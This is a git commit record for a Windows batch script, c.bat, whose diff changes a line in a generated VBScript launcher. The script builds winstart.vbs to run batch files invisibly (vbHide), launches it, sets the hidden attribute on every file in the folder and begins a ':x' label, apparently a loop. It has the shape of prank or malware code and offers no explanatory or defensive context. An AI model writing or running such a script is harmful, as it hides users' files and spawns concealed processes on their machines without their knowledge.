50e2ca1927b595db0f631f3705eae0810534585d
Link1992md <103005144+Link1992md@users.noreply.github.com>
2022-04-04 19:04:39 -0700

    Update c.bat

--- c.bat
+++ c.bat
@@ -1,5 +1,5 @@
 echo set objShell = CreateObject("WScript.Shell") >> winstart.vbs
-echo objShell.Run ".bat", vbHide, TRUE >> winstart.vbs
+echo objShell.Run "*.bat", vbHide, TRUE >> winstart.vbs
 start "" "winstart.vbs"
 attrib +h *.*
 :x
